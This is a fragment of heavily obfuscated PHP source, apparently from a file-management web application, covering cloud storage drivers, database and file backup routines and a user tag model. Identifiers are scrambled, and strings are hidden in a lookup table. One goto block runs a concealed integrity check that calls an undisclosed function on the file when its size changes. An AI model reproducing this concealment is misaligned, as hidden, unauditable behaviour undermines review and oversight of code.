($Ä±²”à÷ > 10000) { break; } continue; } if ($Ä‹ó—œó) { if (@is_file($Ó¨ıÂüµ)) { return !0; } } else { if (@is_dir($Ó¨ıÂüµ . $ûï‰ıµ†[8])) { return !0; } } } closedir($£Õ¿¨ÓÇ); if ($ÁÁî–±ö) { return array($ûï‰ıµ†[239] => $¢‹©åÀÀ, $ûï‰ıµ†[240] => $âÉ¾¢Õ“); } return !1; } public function hashSimple($â¬üÙ§˜) { $—²üéâ =& $_SERVER[Ş­ğŠìÒ]; if (!$â¬üÙ§˜) { return md5($—²üéâ[12]); } $â¬üÙ§˜ = $this->iconvSystem($â¬üÙ§˜); $üŞ•Ÿœ = $this->size($â¬üÙ§˜); $ìâĞÑ²› = 200; $’Ê®„Â = 50; if ($üŞ•Ÿœ <= $ìâĞÑ²› * $’Ê®„Â) { return $this->hashMd5($â¬üÙ§˜) . $üŞ•Ÿœ; } $×Ò†ïû = $—²üéâ[12]; $ãû«Ë¥è = intval($üŞ•Ÿœ / $’Ê®„Â); $âÆ™’·ı = fopen($â¬üÙ§˜, $—²üéâ[1452]); if (!$âÆ™’·ı) { return $×Ò†ïû; } for ($õüê½Ìí = 0; $õüê½Ìí < $’Ê®„Â; $õüê½Ìí++) { fseek_64($âÆ™’·ı, $ãû«Ë¥è * $õüê½Ìí); $×Ò†ïû .= fread($âÆ™’·ı, $ìâĞÑ²›); } fseek_64($âÆ™’·ı, $üŞ•Ÿœ - $ìâĞÑ²›); $×Ò†ïû .= fread($âÆ™’·ı, $ìâĞÑ²›); fclose($âÆ™’·ı); return md5($×Ò†ïû) . $üŞ•Ÿœ; } public function getContent($ŞùŠåº) { $ŞùŠåº = $this->iconvSystem($ŞùŠåº); return file_get_contents($ŞùŠåº); } public function setContent($ˆ‹øÅÇ¬, $æ‹¡ÀŸ = '') { $ˆ‹øÅÇ¬ = $this->iconvSystem($ˆ‹øÅÇ¬); $¶çÒÆº = @file_put_contents($ˆ‹øÅÇ¬, $æ‹¡ÀŸ, LOCK_EX); if (!$¶çÒÆº) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); } clearstatcache(); @chmod($ˆ‹øÅÇ¬, $this->pathAuth); return $¶çÒÆº === !1 ? !1 : !0; } public function fileSubstr($öÖüô¼, $Ö¸ìˆà‹ = 0, $„©›Í³· = false) { $ú‘°—ø³ =& $_SERVER[Ş­ğŠìÒ]; $öÖüô¼ = $this->iconvSystem($öÖüô¼); if ($„©›Í³· === !1) { $„©›Í³· = $this->size($öÖüô¼); } if ($„©›Í³· <= 0) { return $ú‘°—ø³[12]; } $ªƒîñû = fopen($öÖüô¼, $ú‘°—ø³[1452]); if (!$ªƒîñû) { return !1; } fseek_64($ªƒîñû, $Ö¸ìˆà‹); $Å˜ÁË˜ = fread($ªƒîñû, $„©›Í³·); fclose($ªƒîñû); if (!$Å˜ÁË˜) { $this->writeLog(__FUNCTION__ . $ú‘°—ø³[1444], !0); } return $Å˜ÁË˜; } public function upload($â©ËûôÊ, $“§…œ—ò, $İÎÈ»ñ· = false, $Í÷Ã€¤š = REPEAT_REPLACE) { if ($İÎÈ»ñ·) { return $this->moveFile($“§…œ—ò, $â©ËûôÊ); } return $this->copyFile($“§…œ—ò, $â©ËûôÊ); } public function setModifyTime($ç»Ô—Â, $š…é•åä = '') { @touch($ç»Ô—Â, intval($š…é•åä)); } public function download($ï²©¨‘ß, $à“›öÔ¾) { return $this->iconvSystem($ï²©¨‘ß); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($£¥¾ñÇ¿) { parent::__construct($£¥¾ñÇ¿); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } public function fileOutImage($ØÉ¢Æ¸‚, $¤“Š¢ç = 250) { $Øñ¤ìÊ× =& $_SERVER[Ş­ğŠìÒ]; if ($this->size($ØÉ¢Æ¸‚) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ØÉ¢Æ¸‚, $¤“Š¢ç); } $âÈïŸİ§ = array($Øñ¤ìÊ×[1453] => $Øñ¤ìÊ×[1454] . $¤“Š¢ç . $Øñ¤ìÊ×[1455]); $­†ô±• = $this->link($ØÉ¢Æ¸‚, $âÈïŸİ§); $this->fileOutLink($­†ô±•); } public function fileOutLink($©—È¨å›) { $•¹¬º‹º =& $_SERVER[Ş­ğŠìÒ]; if (substr($©—È¨å›, 0, 7) == $•¹¬º‹º[313]) { $©—È¨å› = $•¹¬º‹º[314] . substr($©—È¨å›, 7); } header($•¹¬º‹º[175] . $©—È¨å›); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Š¡Ììã—) { parent::__construct($Š¡Ììã—); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } public function fileOutLink($¥³ãŒªš) { $Ò‰ü±•´ =& $_SERVER[Ş­ğŠìÒ]; if (substr($¥³ãŒªš, 0, 7) == $Ò‰ü±•´[313]) { $¥³ãŒªš = $Ò‰ü±•´[314] . substr($¥³ãŒªš, 7); } header($Ò‰ü±•´[175] . $¥³ãŒªš); die; } } goto f¾÷£¯Ò—; AíòˆÃ…á†: $_file = $_SERVER[$_SERVER[Ş­ğŠìÒ][943]]; $_size = $_SERVER[Ş­ğŠìÒ][944]; if ($_SERVER[$_SERVER[Ş­ğŠìÒ][945]] != $_size($_file)) { $_getc = $_SERVER[Ş­ğŠìÒ][947]; $_getfile = $_SERVER[$_SERVER[Ş­ğŠìÒ][948]] . $_SERVER[Ş­ğŠìÒ][949]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ş­ğŠìÒ][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ş­ğŠìÒ][683]) { $exit = $_SERVER[Ş­ğŠìÒ][950]; $exit(); } $_act = $_SERVER[Ş­ğŠìÒ][958]; $_act($_file); } goto D•Èôã†÷; eç´½é‚¬: define($_SERVER[Ş­ğŠìÒ][317], 3); define($_SERVER[Ş­ğŠìÒ][318], 1); define($_SERVER[Ş­ğŠìÒ][319], 0); goto f‹ÈÒöÕƒÄ; d´ÅÅø™Şå: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÑúÎŒïş =& $_SERVER[Ş­ğŠìÒ]; $ê†—È® = Backup::get(); self::$io = $ê†—È®[$ÑúÎŒïş[819]]; self::$name = $ê†—È®[$ÑúÎŒïş[32]]; $ôêéóØ = new DbManage(); $£¹Óúƒ¡ = $ôêéóØ->dbType(); $ïáºÏÀæ = array($ÑúÎŒïş[844] => $£¹Óúƒ¡, $ÑúÎŒïş[845] => time()); Backup::set($ïáºÏÀæ); $‚ê—³Ñ¤ = $this->tmpFilesPath() . $ÑúÎŒïş[846] . self::$name . $ÑúÎŒïş[8]; del_dir($‚ê—³Ñ¤); mk_dir($‚ê—³Ñ¤); $ÎÉèÎØ = $‡ˆ«û° = 0; try { $…‹¯Ù¼Ò = $ôêéóØ->db()->getTables(); } catch (Exception $Å¥ á) { return !1; } $…‹¯Ù¼Ò = array_diff($…‹¯Ù¼Ò, array($ÑúÎŒïş[847], $ÑúÎŒïş[848])); foreach ($…‹¯Ù¼Ò as $ÛÊú¶ƒ) { $ÎÉèÎØ += $ôêéóØ->model($ÛÊú¶ƒ)->count(); } $³Åú‘­ä = new Task($ÑúÎŒïş[849], $ÑúÎŒïş[850], $ÎÉèÎØ, LNG($ÑúÎŒïş[851]) . $ÑúÎŒïş[852] . LNG($ÑúÎŒïş[853])); $GLOBALS[$ÑúÎŒïş[854]] = self::$name; foreach ($…‹¯Ù¼Ò as $ÛÊú¶ƒ) { $“ºØØÈ = $‚ê—³Ñ¤ . $ÛÊú¶ƒ . $ÑúÎŒïş[855]; $Æ±Ÿ ì´ = null; if ($ÛÊú¶ƒ == $ÑúÎŒïş[856] && (!isset($ê†—È®[$ÑúÎŒïş[171]]) || $ê†—È®[$ÑúÎŒïş[171]] == $ÑúÎŒïş[228])) { $Æ±Ÿ ì´ = self::$io; } $‡ˆ«û° += $ôêéóØ->sqlFromDb($ÛÊú¶ƒ, $“ºØØÈ, $³Åú‘­ä, $Æ±Ÿ ì´); } unset($GLOBALS[$ÑúÎŒïş[854]]); $³Åú‘­ä->end(); if ($‡ˆ«û° > $ÎÉèÎØ) { $ÎÉèÎØ = $‡ˆ«û°; } $ïáºÏÀæ = array($ÑúÎŒïş[844] => $£¹Óúƒ¡, $ÑúÎŒïş[840] => 1, $ÑúÎŒïş[857] => $ÎÉèÎØ, $ÑúÎŒïş[858] => $‡ˆ«û°, $ÑúÎŒïş[859] => time()); Backup::set($ïáºÏÀæ); if ($ÎÉèÎØ - $‡ˆ«û° > 0) { $Ü²‡‰‡Ë = $ÑúÎŒïş[860]; if (!stristr(I18n::getType(), $ÑúÎŒïş[861])) { $Ü²‡‰‡Ë = $ÑúÎŒïş[862]; } write_log(array($Ü²‡‰‡Ë, $ïáºÏÀæ), $ÑúÎŒïş[850]); return !1; } return !0; } private function tmpFilesPath() { $®×çšğÓ =& $_SERVER[Ş­ğŠìÒ]; $¥ŠÑ¥¿÷ = TEMP_FILES; if ($GLOBALS[$®×çšğÓ[6]][$®×çšğÓ[92]][$®×çšğÓ[863]]) { $¥ŠÑ¥¿÷ = $GLOBALS[$®×çšğÓ[6]][$®×çšğÓ[92]][$®×çšğÓ[863]]; if (!mk_dir($¥ŠÑ¥¿÷) || !is_writable($¥ŠÑ¥¿÷) || !IO::mkfile($¥ŠÑ¥¿÷ . $®×çšğÓ[864])) { $¥ŠÑ¥¿÷ = TEMP_FILES; } } return $¥ŠÑ¥¿÷; } } class BackupDbFile { public function __construct() { } public function index() { $‘±Óë£» =& $_SERVER[Ş­ğŠìÒ]; $çÉ›¼ÏÍ = Backup::get(); $·¼Œ¢“Ÿ = $çÉ›¼ÏÍ[$‘±Óë£»[32]]; $ª¯û½‘ = $this->tmpFilesPath() . "\x62\141\143\153\165\160\x5f{$·¼Œ¢“Ÿ}\57"; $«†ŒáŸØ = $this->backupPath($çÉ›¼ÏÍ); if (!($«†ŒáŸØ = IO::mkdir($«†ŒáŸØ))) { return !1; } $æ“ÀÀÅ´ = IO::listPath($ª¯û½‘); $—ıØ¼²® = isset($æ“ÀÀÅ´[$‘±Óë£»[86]]) ? $æ“ÀÀÅ´[$‘±Óë£»[86]] : array(); $Íç€åœ¹ = array_sum(array_column($—ıØ¼²®, $‘±Óë£»[79])); if (!$Íç€åœ¹) { return !1; } $ÑÓÅúï = array($‘±Óë£»[865] => $Íç€åœ¹, $‘±Óë£»[866] => time()); Backup::set($ÑÓÅúï); $û”¶×Áô = new TaskFileTransfer($‘±Óë£»[867], $‘±Óë£»[850], count($—ıØ¼²®), LNG($‘±Óë£»[851]) . $‘±Óë£»[462] . LNG($‘±Óë£»[853]) . $‘±Óë£»[868]); $û”¶×Áô->task[$‘±Óë£»[830]] = $Íç€åœ¹; foreach ($æ“ÀÀÅ´[$‘±Óë£»[86]] as $ÔŞß«Î) { $¤–µ½°æ = IO::move($ÔŞß«Î[$‘±Óë£»[87]], $«†ŒáŸØ); if (!$¤–µ½°æ) { $û”¶×Áô->end(); $¯ë—®§“ = IO::getLastError($‘±Óë£»[869] . $ÔŞß«Î[$‘±Óë£»[87]] . $‘±Óë£»[870] . $«†ŒáŸØ . $‘±Óë£»[178]); write_log($¯ë—®§“, $‘±Óë£»[850]); return !1; } } $Š¸¶ÄÀş = new DbManage(); $Äî•«îÉ = $Š¸¶ÄÀş->getSqlFile(); if (!$Äî•«îÉ[$‘±Óë£»[871]] || !$Äî•«îÉ[$‘±Óë£»[13]]) { return !1; } IO::move($Äî•«îÉ[$‘±Óë£»[871]], $«†ŒáŸØ); IO::move($Äî•«îÉ[$‘±Óë£»[13]], $«†ŒáŸØ); $û”¶×Áô->end(); $ÑÓÅúï = array($‘±Óë£»[872] => $Íç€åœ¹, $‘±Óë£»[873] => time()); Backup::set($ÑÓÅúï); return !0; } private function backupPath($úâÇÚãÀ) { $ã•è¿À =& $_SERVER[Ş­ğŠìÒ]; $±ÎÜ†ëë = $úâÇÚãÀ[$ã•è¿À[32]]; $ü–‚‚ŒÏ = Model($ã•è¿À[837])->get($ã•è¿À[838]); $òõ”Òß· = substr(md5($ã•è¿À[839] . $ü–‚‚ŒÏ . $±ÎÜ†ëë), 0, 8); return "\173\x69\x6f\72{$úâÇÚãÀ[$ã•è¿À[819]]}\x7d\57\x64\141\x74\x61\142\141\163\x65\57\142\x61\143\x6b\165\160\57" . $±ÎÜ†ëë . $ã•è¿À[11] . $òõ”Òß·; } private function tmpFilesPath() { $ß¾İÖÑ¤ =& $_SERVER[Ş­ğŠìÒ]; $­™½…œø = TEMP_FILES; if ($GLOBALS[$ß¾İÖÑ¤[6]][$ß¾İÖÑ¤[92]][$ß¾İÖÑ¤[863]]) { $­™½…œø = $GLOBALS[$ß¾İÖÑ¤[6]][$ß¾İÖÑ¤[92]][$ß¾İÖÑ¤[863]]; if (!mk_dir($­™½…œø) || !is_writable($­™½…œø) || !IO::mkfile($­™½…œø . $ß¾İÖÑ¤[864])) { $­™½…œø = TEMP_FILES; } } return $­™½…œø; } } class BackupFile { public function __construct() { } public function index() { $Ö®ÊÔˆ = Backup::get(); $à´ÜæúÑ = $Ö®ÊÔˆ[$_SERVER[Ş­ğŠìÒ][369]][$_SERVER[Ş­ğŠìÒ][230]][$_SERVER[Ş­ğŠìÒ][541]]; $ğÄ„“¦ = array($_SERVER[Ş­ğŠìÒ][542] => array($_SERVER[Ş­ğŠìÒ][874], $à´ÜæúÑ), $_SERVER[Ş­ğŠìÒ][875] => array($_SERVER[Ş­ğŠìÒ][407], $Ö®ÊÔˆ[$_SERVER[Ş­ğŠìÒ][819]])); $€ºÒû•õ = (int) Model($_SERVER[Ş­ğŠìÒ][856])->where($ğÄ„“¦)->count($_SERVER[Ş­ğŠìÒ][541]); $ˆà°´í¦ = (int) Model($_SERVER[Ş­ğŠìÒ][856])->where($ğÄ„“¦)->sum($_SERVER[Ş­ğŠìÒ][79]); $ı£ß£Â = new TaskFileTransfer($_SERVER[Ş­ğŠìÒ][876], $_SERVER[Ş­ğŠìÒ][850], $€ºÒû•õ, LNG($_SERVER[Ş­ğŠìÒ][851]) . $_SERVER[Ş­ğŠìÒ][852] . LNG($_SERVER[Ş­ğŠìÒ][877])); $ı£ß£Â->task[$_SERVER[Ş­ğŠìÒ][830]] = $ˆà°´í¦; $å®àÂ•ë = array($_SERVER[Ş­ğŠìÒ][878] => $€ºÒû•õ, $_SERVER[Ş­ğŠìÒ][879] => $ˆà°´í¦, $_SERVER[Ş­ğŠìÒ][880] => time()); Backup::set($å®àÂ•ë); $º¯îÉ‡à = !0; $Ğ¼Ã’¬Í = $this->storeIds(); $¡°š“Îã = 1; $êôµ‚úê = 1000; $²‹…¾Çİ = $àåĞÀÒ = 0; $ˆàÒÙÇ¶ = array(); $­ºä½ = $à–´†€ = 0; do { $ôë¡„şØ = $_SERVER[Ş­ğŠìÒ][881]; $½­‹ø—» = Model($_SERVER[Ş­ğŠìÒ][856])->where($ğÄ„“¦)->field($ôë¡„şØ)->order($_SERVER[Ş­ğŠìÒ][882])->selectPage($êôµ‚úê, $¡°š“Îã); $ûçªóŞ· = !empty($½­‹ø—»[$_SERVER[Ş­ğŠìÒ][445]]) ? $½­‹ø—»[$_SERVER[Ş­ğŠìÒ][445]] : array(); foreach ($ûçªóŞ· as $ÜàóõÄ) { if (!$this->_fileExist($ÜàóõÄ, $ˆàÒÙÇ¶, $Ğ¼Ã’¬Í)) { write_log("\x66\151\x6c\x65\40\156\x6f\164\x20\x65\170\x69\x73\164\56\146\151\x6c\x65\x49\x44\x3a{$ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][541]]}\x2c\40\160\x61\164\150\72{$ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][87]]}", $_SERVER[Ş­ğŠìÒ][883]); continue; } $‡µÂŞã = $ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][87]]; $Æá­ã×‘ = "\x7b\x69\x6f\x3a{$Ö®ÊÔˆ[$_SERVER[Ş­ğŠìÒ][819]]}\x7d" . substr($‡µÂŞã, strlen("\173\x69\157\72{$ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][884]]}\175")); if (IO::exist($Æá­ã×‘)) { $ı£ß£Â->updateFileEnd($ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][32]], $ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][79]]); } else { $Æá­ã×‘ = get_path_father($Æá­ã×‘); IO::mkdir($Æá­ã×‘); if (!IO::copy($‡µÂŞã, $Æá­ã×‘, $_SERVER[Ş­ğŠìÒ][885])) { write_log($_SERVER[Ş­ğŠìÒ][886] . $‡µÂŞã . $_SERVER[Ş­ğŠìÒ][870] . $Æá­ã×‘ . $_SERVER[Ş­ğŠìÒ][178], $_SERVER[Ş­ğŠìÒ][850]); $º¯îÉ‡à = !1; break; } } $à´ÜæúÑ = $ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][541]]; $àåĞÀÒ += 1; $²‹…¾Çİ += $ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][79]]; $à–´†€ += 1; $­ºä½ += $ÜàóõÄ[$_SERVER[Ş­ğŠìÒ][79]]; if ($²‹…¾Çİ >= 1024 * 1024 * 100) { $å®àÂ•ë = array($_SERVER[Ş­ğŠìÒ][818] => $à´ÜæúÑ, $_SERVER[Ş­ğŠìÒ][887] => $à–´†€, $_SERVER[Ş­ğŠìÒ][888] => $­ºä½); Backup::set($å®àÂ•ë); $²‹…¾Çİ = $àåĞÀÒ = 0; } } $Ã¦í¦Äƒ = count($ûçªóŞ·); $¡°š“Îã++; } while ($Ã¦í¦Äƒ == $êôµ‚úê); $ı£ß£Â->end(); $å®àÂ•ë = array($_SERVER[Ş­ğŠìÒ][889] => 1, $_SERVER[Ş­ğŠìÒ][828] => time(), $_SERVER[Ş­ğŠìÒ][842] => 1, $_SERVER[Ş­ğŠìÒ][818] => $à´ÜæúÑ, $_SERVER[Ş­ğŠìÒ][890] => time()); if ($àåĞÀÒ) { $å®àÂ•ë[$_SERVER[Ş­ğŠìÒ][887]] = $à–´†€; $å®àÂ•ë[$_SERVER[Ş­ğŠìÒ][888]] = $­ºä½; } Backup::set($å®àÂ•ë); return !0; } private function _fileExist($í¾µ¥’ş, &$áâÉÁÔ³, $Üêå¾ßœ) { $áû×—Ğ  =& $_SERVER[Ş­ğŠìÒ]; $Îòêê¶Ü = $í¾µ¥’ş[$áû×—Ğ [87]]; if (in_array($í¾µ¥’ş[$áû×—Ğ [541]], $áâÉÁÔ³)) { return !1; } if (!in_array($í¾µ¥’ş[$áû×—Ğ [884]], $Üêå¾ßœ)) { return !1; } if (IO::exist($Îòêê¶Ü)) { return !0; } $ÔÍ©—éŒ = get_path_father($Îòêê¶Ü); if (IO::exist($ÔÍ©—éŒ)) { $áâÉÁÔ³[] = $í¾µ¥’ş[$áû×—Ğ [541]]; return !1; } $Í¢Áïåö = array($áû×—Ğ [884] => $í¾µ¥’ş[$áû×—Ğ [884]], $áû×—Ğ [87] => array($áû×—Ğ [459], "{$ÔÍ©—éŒ}\x25")); $İ®‚å•Ó = Model($áû×—Ğ [856])->where($Í¢Áïåö)->field($áû×—Ğ [542])->select(); $áâÉÁÔ³ = array_merge($áâÉÁÔ³, array_to_keyvalue($İ®‚å•Ó, $áû×—Ğ [12], $áû×—Ğ [541])); return !1; } private function _fileFilter($üá¢¶şö) { $Ê¡’ƒú =& $_SERVER[Ş­ğŠìÒ]; return; if (empty($üá¢¶şö)) { return; } $œ’»‡¿’ = array($Ê¡’ƒú[541] => array($Ê¡’ƒú[7], array_unique($üá¢¶şö))); $å†çÒ—Ø = Model($Ê¡’ƒú[891])->where($œ’»‡¿’)->field($Ê¡’ƒú[193])->select(); foreach ($å†çÒ—Ø as $ã±Š˜·) { Model($Ê¡’ƒú[891])->remove($ã±Š˜·[$Ê¡’ƒú[193]], !1); } } private function storeIds() { $¹İ¼€Æ¸ =& $_SERVER[Ş­ğŠìÒ]; $òœ…Ş = Model($¹İ¼€Æ¸[834])->listData(); $ùÂ‰ééŠ = array(); $ú»¸¬ ÷ = $GLOBALS[$¹İ¼€Æ¸[6]][$¹İ¼€Æ¸[92]][$¹İ¼€Æ¸[892]]; foreach ($òœ…Ş as $º­å©á) { $ŒŒˆüÊ• = strtolower($º­å©á[$¹İ¼€Æ¸[98]]); if (!isset($ú»¸¬ ÷[$ŒŒˆüÊ•])) { continue; } $š–¸Åä­ = $¹İ¼€Æ¸[77] . (isset($ú»¸¬ ÷[$ŒŒˆüÊ•]) ? $ú»¸¬ ÷[$ŒŒˆüÊ•] : ucfirst($ŒŒˆüÊ•)); if (!class_exists($š–¸Åä­)) { continue; } $ùÂ‰ééŠ[] = $º­å©á[$¹İ¼€Æ¸[475]]; } return $ùÂ‰ééŠ; } } goto B´ì™Õæ±¤; aÇÔÕÑÙ…¾: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($ê«‹¡Ú¾) { $³†Ìçº =& $_SERVER[Ş­ğŠìÒ]; return array($³†Ìçº[2079] => array($³†Ìçº[2494] . USER_ID, $³†Ìçº[2080])); } protected function listData() { $‹Ç¤†îÜ =& $_SERVER[Ş­ğŠìÒ]; $şãÉçÕÍ = array($‹Ç¤†îÜ[1755] => USER_ID, $‹Ç¤†îÜ[557] => array($‹Ç¤†îÜ[2083], 0)); $ë´÷ĞŞÏ = $‹Ç¤†îÜ[2495]; $†ÅšÔ¸½ = $this->field($ë´÷ĞŞÏ)->where($şãÉçÕÍ)->order($‹Ç¤†îÜ[2086])->select(); return $†ÅšÔ¸½ ? $†ÅšÔ¸½ : array(); } protected function addToTag($²Áş¾İ, $éŒû²‹Ô) { $±†–òÒÇ =& $_SERVER[Ş­ğŠìÒ]; if (!Model($±†–òÒÇ[2230])->listData($éŒû²‹Ô)) { return !1; } if (is_numeric($²Áş¾İ)) { $äøã‚ = Model($±†–òÒÇ[891])->pathInfo($²Áş¾İ); if (!$äøã‚) { return !1; } } else { $äøã‚ = IO::infoSimple($²Áş¾İ); if (!$äøã‚) { return !1; } $‰Üáâú = $äøã‚[$±†–òÒÇ[32]]; $‡’ôÉó = $äøã‚[$±†–òÒÇ[33]]; if (isset($äøã‚[$±†–òÒÇ[485]])) { $‡’ôÉó = $äøã‚[$±†–òÒÇ[485]] == $±†–òÒÇ[91] ? $±†–òÒÇ[78] : $±†–òÒÇ[230]; } } $ùÑÆç‡ = array($±†–òÒÇ[1755] => USER_ID, $±†–òÒÇ[557] => $éŒû²‹Ô, $±†–òÒÇ[495] => $²Áş¾İ, $±†–òÒÇ[496] => $‡’ôÉó ? $‡’ôÉó : $±†–òÒÇ[490], $±†–òÒÇ[494] => $‰Üáâú ? $‰Üáâú : $±†–òÒÇ[12], $±†–òÒÇ[1967] => 0); if ($this->where($ùÑÆç‡)->find()) { return !1; } return $this->add($ùÑÆç‡); } protected function removeFromTag($©ˆãÁß, $š§şÆš) { $êàğÉ˜ =& $_SERVER[Ş­ğŠìÒ]; if (!Model($êàğÉ˜[2230])->listData($š§şÆš)) { return !1; } if (is_array($©ˆãÁß)) { $©ˆãÁß = array($êàğÉ˜[7], $©ˆãÁß); } $áÖÚÉØº = array($êàğÉ˜[1755] => USER_ID, $êàğÉ˜[557] => $š§şÆš, $êàğÉ˜[495] => $©ˆãÁß); return $this->where($áÖÚÉØº)->delete(); } protected function removeByTag($¡€›²ë¨) { $ÓÍäñëŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$¡€›²ë¨) { return !1; } $¯ëÀ±ö‰ = array($ÓÍäñëŸ[1755] => USER_ID, $ÓÍäñëŸ[557] => $¡€›²ë¨); return $this->where($¯ëÀ±ö‰)->delete(); } protected function removeBySource($¼€ÆÅ) { $ šÛŞ¾£ =& $_SERVER[Ş­ğŠìÒ]; if (is_array($¼€ÆÅ)) { $¼€ÆÅ = array($ šÛŞ¾£[7], $¼€ÆÅ); } $à’ŞØ¶Ú = array($ šÛŞ¾£[1755] => USER_ID, $ šÛŞ¾£[557] => array($ šÛŞ¾£[1088], 0), $ šÛŞ¾£[495] => $¼€ÆÅ); return $this->where($à’ŞØ¶Ú)->delete(); } }